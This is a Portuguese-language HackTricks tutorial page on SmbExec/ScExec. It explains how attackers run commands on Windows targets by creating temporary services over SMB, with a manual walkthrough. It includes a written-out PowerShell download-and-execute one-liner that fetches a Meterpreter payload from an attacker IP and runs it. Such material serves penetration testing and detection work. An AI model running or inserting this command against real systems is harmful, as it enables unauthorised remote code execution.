# SmbExec/ScExec

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Como funciona

**Smbexec funciona como Psexec.** Neste exemplo, **em vez** de apontar o "_binpath_" para um executável malicioso dentro da vítima, vamos **direcioná-lo** para **cmd.exe ou powershell.exe** e um deles irá baixar e executar o backdoor.

## **SMBExec**

Vamos ver o que acontece quando o smbexec é executado, observando do lado do atacante e do alvo:

![](../../.gitbook/assets/smbexec\_prompt.png)

Então sabemos que ele cria um serviço "BTOBTO". Mas esse serviço não está presente na máquina alvo quando fazemos um `sc query`. Os logs do sistema revelam uma pista do que aconteceu:

![](../../.gitbook/assets/smbexec\_service.png)

O Nome do Arquivo de Serviço contém uma string de comando para executar (%COMSPEC% aponta para o caminho absoluto do cmd.exe). Ele ecoa o comando a ser executado para um arquivo bat, redireciona o stdout e stderr para um arquivo Temp, executa o arquivo bat e o deleta. De volta ao Kali, o script Python então puxa o arquivo de saída via SMB e exibe o conteúdo em nosso "pseudo-shell". Para cada comando que digitamos em nosso "shell", um novo serviço é criado e o processo é repetido. É por isso que não é necessário soltar um binário, ele apenas executa cada comando desejado como um novo serviço. Definitivamente mais furtivo, mas como vimos, um log de eventos é criado para cada comando executado. Ainda assim, uma maneira muito inteligente de obter um "shell" não interativo!

## Manual SMBExec

**Ou executando comandos via serviços**

Como o smbexec demonstrou, é possível executar comandos diretamente de binPaths de serviços em vez de precisar de um binário. Isso pode ser um truque útil para ter na manga se você precisar executar apenas um comando arbitrário em uma máquina Windows alvo. Como um exemplo rápido, vamos obter um shell Meterpreter usando um serviço remoto _sem_ um binário.

Usaremos o módulo `web_delivery` do Metasploit e escolheremos um alvo PowerShell com um payload Meterpreter reverso. O listener é configurado e ele nos diz o comando a executar na máquina alvo:
```
powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');
```
Do nosso ataque Windows, criamos um serviço remoto ("metpsh") e definimos o binPath para executar cmd.exe com nosso payload:

![](../../.gitbook/assets/sc\_psh\_create.png)

E então o iniciamos:

![](../../.gitbook/assets/sc\_psh\_start.png)

Ele apresenta erro porque nosso serviço não responde, mas se olharmos para o nosso ouvinte do Metasploit, vemos que o callback foi feito e o payload executado.

Todas as informações foram extraídas daqui: [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
